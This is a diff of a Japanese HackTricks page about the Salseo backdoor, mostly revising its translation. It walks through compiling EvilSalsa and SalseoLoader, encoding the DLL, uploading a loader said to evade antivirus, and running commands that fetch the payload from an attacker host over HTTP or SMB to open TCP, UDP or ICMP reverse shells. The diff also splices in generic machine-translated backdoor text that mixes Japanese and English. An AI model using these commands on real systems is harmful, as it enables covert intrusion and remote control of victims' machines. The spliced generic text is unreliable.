@@ -6,7 +6,7 @@
 
 * **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
@@ -16,9 +16,9 @@
 
 githubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**が必要です。
 
-これらのプロジェクトを、使用するWindowsボックスのアーキテクチャに合わせてコンパイルしてください（Windowsがx64をサポートしている場合は、そのアーキテクチャにコンパイルします）。
+これらのプロジェクトを、使用するWindowsボックスのアーキテクチャに合わせてコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャにコンパイルします）。
 
-Visual Studio内の**左側の"Build"タブ**の**"Platform Target"**でアーキテクチャを**選択**できます。
+Visual Studio内で、**左側の"Build"タブ**の**"Platform Target"**でアーキテクチャを**選択**できます。
 
 (\*\*このオプションが見つからない場合は、**"Project Tab"**を押し、次に**"\<Project Name> Properties"**を押します)
 
@@ -30,7 +30,7 @@ Visual Studio内の**左側の"Build"タブ**の**"Platform Target"**でアー�
 
 ## バックドアの準備
 
-まず、**EvilSalsa.dll**をエンコードする必要があります。これを行うには、pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルできます：
+まず、**EvilSalsa.dll**をエンコードする必要があります。これには、Pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルすることができます：
 
 ### **Python**
 ```
@@ -39,54 +39,26 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Windowsは、最も一般的なオペレーティングシステムの1つであり、多くのバージョンが存在します。Windowsには、バックドアを作成するためのさまざまな方法があります。
+Windows（ウィンドウズ）は、マイクロソフトが開発したオペレーティングシステムです。Windowsには、バックドアを作成してシステムに不正アクセスするためのさまざまなテクニックがあります。以下にいくつかの一般的なテクニックを紹介します。
 
-#### リモートデスクトップ
+#### リモートデスクトップ（RDP）バックドア
 
-リモートデスクトップ（RDP）は、Windowsマシンにリモートでアクセスするための機能です。攻撃者は、有効な資格情報を使用してRDPに接続し、ターゲットマシンにアクセスすることができます。
+リモートデスクトップ（RDP）は、Windowsマシンにリモートでアクセスするためのプロトコルです。ハッカーは、RDPバックドアを作成して、標的のシステムに不正アクセスすることができます。RDPバックドアを作成するためには、リモートデスクトップサービスを悪用する方法や、既存のRDPバックドアツールを使用する方法があります。
 
-#### バックドアアプリケーション
+#### サービスバックドア
 
-バックドアアプリケーションは、ターゲットマシンにインストールされたソフトウェアの一部として動作します。これにより、攻撃者はターゲットマシンにアクセスし、機密情報を盗むことができます。
+Windowsでは、バックグラウンドで実行されるサービスがあります。ハッカーは、これらのサービスにバックドアを仕込むことで、システムに不正アクセスすることができます。サービスバックドアを作成するためには、既存のサービスを悪用する方法や、新しいサービスを作成する方法があります。
 
-#### サービスの改ざん
+#### ユーザーアカウントバックドア
 
-攻撃者は、Windowsサービスを改ざんすることでバックドアを作成することができます。これにより、攻撃者はターゲットマシンにアクセスし、システムの制御を取ることができます。
+Windowsでは、ユーザーアカウントを使用してシステムにログインします。ハッカーは、ユーザーアカウントにバックドアを仕込むことで、システムに不正アクセスすることができます。ユーザーアカウントバックドアを作成するためには、既存のユーザーアカウントを悪用する方法や、新しいユーザーアカウントを作成する方法があります。
 
-#### レジストリの改ざん
-
-レジストリは、Windowsオペレーティングシステムの設定情報を格納するデータベースです。攻撃者は、レジストリを改ざんすることでバックドアを作成し、ターゲットマシンにアクセスすることができます。
-
-#### ファイルの改ざん
-
-攻撃者は、Windowsシステムファイルを改ざんすることでバックドアを作成することができます。これにより、攻撃者はターゲットマシンにアクセスし、システムを制御することができます。
-
-#### プロセスの改ざん
-
-攻撃者は、Windowsプロセスを改ざんすることでバックドアを作成することができます。これにより、攻撃者はターゲットマシンにアクセスし、システムを制御することができます。
-
-#### ネットワークトラフィックの傍受
-
-攻撃者は、ネットワークトラフィックを傍受することでバックドアを作成することができます。これにより、攻撃者はターゲットマシンにアクセスし、機密情報を盗むことができます。
-
-#### プリインストールバックドア
-
-プリインストールバックドアは、Windowsマシンに最初から組み込まれているバックドアです。これにより、攻撃者はターゲットマシンにアクセスし、システムを制御することができます。
-
-#### ゼロデイエクスプロイト
-
-ゼロデイエクスプロイトは、まだ修正されていないセキュリティの脆弱性を利用する攻撃手法です。攻撃者は、ゼロデイエクスプロイトを使用してWindowsマシンにバックドアを作成し、システムにアクセスすることができます。
-
-#### パスワードのクラック
-
-攻撃者は、パスワードのクラックを使用してWindowsマシンにアクセスすることができます。これにより、攻撃者はターゲットマシンにバックドアを作成し、システムを制御することができます。
-
-以上が、Windowsでバックドアを作成するための一般的な方法です。これらの方法を理解し、対策を講じることが重要です。
+これらは、Windowsで使用される一般的なバックドア作成テクニックの一部です。ハッカーはこれらのテクニックを悪用してシステムに侵入することができるため、セキュリティ対策を強化する必要があります。
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok、Salseoのすべてを実行するために必要なものが揃いました：**エンコードされたEvilDalsa.dll**と**SalseoLoaderのバイナリ**。
+よし、これでSalseoのすべてを実行するために必要なものが揃いました: **エンコードされたEvilDalsa.dll**と**SalseoLoaderのバイナリ**です。
 
 **SalseoLoader.exeバイナリをマシンにアップロードしてください。どのAVにも検出されないはずです...**
 
@@ -98,9 +70,9 @@ Ok、Salseoのすべてを実行するために必要なものが揃いました
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **UDPリバースシェルの取得（SMBを介してエンコードされたdllをダウンロード）**
+### **UDPリバースシェルの取得（SMBを介してエンコードされたdllをダウンロードする）**
 
-リバースシェルのリスナーとしてncを起動し、エンコードされたevilsalsaを提供するためのSMBサーバー（impacket-smbserver）を起動することを忘れないでください。
+リバースシェルのリスナーとしてncを起動し、エンコードされたevilsalsaを提供するためのSMBサーバー（impacket-smbserver）を起動することを忘れないようにしてください。
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
@@ -115,13 +87,13 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### クライアントの実行:
+#### クライアントを実行する:
 
 ```bash
 ./client
 ```
 
-クライアントを実行します。
+The client will connect to the server and wait for commands.
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -135,7 +107,7 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ### メイン関数の前に\[DllExport]を追加します。
 
-![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
 
 ### このプロジェクトにDllExportをインストールします。
 
@@ -143,7 +115,7 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
 
-#### **DllExportパッケージを検索します（ブラウズタブを使用）し、インストールを押します（ポップアップを受け入れます）**
+#### **DllExportパッケージを検索（ブラウズタブを使用）し、インストールボタンを押します（ポップアップを受け入れます）**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
 
@@ -177,21 +149,21 @@ Visual Studioを**終了**します。
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームターゲット = x64）
+**x64** **プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームターゲット = x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-ソリューションをビルドするには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
+ソリューションを**ビルド**するには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
 
 ### 生成されたDLLをテストします。
 
 テストしたい場所にDLLをコピーして貼り付けます。
 
-実行するコマンド：
+実行します：
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-もしエラーが表示されなければ、おそらく機能するDLLを持っています！
+エラーが表示されない場合、おそらく機能するDLLを持っています！
 
 ## DLLを使用してシェルを取得する
 
@@ -206,7 +178,9 @@ $env:lport="1337"
 $env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
-CMD（コマンドプロンプト）は、Windowsオペレーティングシステムで使用されるコマンドラインインターフェースです。CMDを使用すると、コマンドを入力してシステムの様々な操作を実行することができます。CMDは、システムの設定変更、ファイルの操作、ネットワークの設定など、さまざまなタスクを実行するために使用されます。CMDは、ハッカーにとっても便利なツールであり、システムの脆弱性を悪用するために使用されることもあります。ハッカーは、CMDを使用してバックドアを作成し、システムに不正アクセスすることができます。CMDは、ハッキングの技術の一部として広く使用されています。
+### CMD
+
+CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a way to interact with the system through text-based commands. CMD can be used to execute various commands, navigate through directories, run scripts, and perform administrative tasks. It is a powerful tool for both legitimate users and hackers, as it allows for direct control and manipulation of the system. Hackers often use CMD to execute malicious commands, create backdoors, and gain unauthorized access to a target system. It is important for system administrators and security professionals to be familiar with CMD and its capabilities in order to detect and prevent unauthorized activities.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -219,10 +193,10 @@ rundll32.exe SalseoLoader.dll,main
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ会社で働いていますか？** HackTricksで**会社を宣伝したい**ですか？または、**PEASSの最新バージョンにアクセスしたい**ですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **ハッキングのトリックを共有する**には、[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
